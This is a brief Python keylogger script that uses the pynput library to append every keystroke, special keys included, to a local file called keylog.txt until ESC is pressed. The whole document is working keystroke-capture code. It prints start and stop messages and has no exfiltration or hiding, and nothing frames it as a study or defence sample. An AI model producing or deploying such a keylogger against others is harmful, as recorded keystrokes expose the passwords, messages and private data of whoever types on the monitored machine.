from pynput import keyboard

# File where keystrokes will be saved
log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        # For special keys (Enter, Space, Shift etc.)
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

def on_release(key):
    # Stop logging when ESC is pressed
    if key == keyboard.Key.esc:
        print("Keylogger stopped.")
        return False

print("Keylogger started... Press ESC to stop.")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()